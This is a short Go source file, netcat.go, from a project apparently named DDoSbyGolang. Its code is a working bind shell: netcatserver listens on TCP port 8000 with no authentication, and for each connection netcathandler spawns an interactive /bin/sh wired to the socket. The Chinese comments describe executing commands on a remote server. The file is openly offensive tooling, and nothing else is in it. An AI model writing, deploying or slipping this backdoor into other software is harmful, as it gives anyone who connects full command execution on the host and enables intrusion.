/*
 * @Author: uyplayer
 * @Date: 2022/3/30 21:13
 * @Email: uyplayer@qq.com
 * @File: netcat.go
 * @Software: GoLand
 * @Dir: DDoSbyGolang / bhg
 * @Project_Name: DDoSbyGolang
 * @Description:
 */

package bhg

import (
	"io"
	"net"
	"os/exec"
)

func netcathandler(conn net.Conn) {

	// 远程服务器上执行命令行
	cmd := exec.Command("/bin/sh", "-i")
	rp, wp := io.Pipe()

	// 输入
	cmd.Stdin = conn // 连接到conn
	cmd.Stdout = wp
	go io.Copy(conn, rp) // 读出
	cmd.Run()
	conn.Close()

}
func netcatserver() {

	listener, _ := net.Listen("tcp", ":8000")

	for {
		conn, _ := listener.Accept()

		go netcathandler(conn)

	}
}
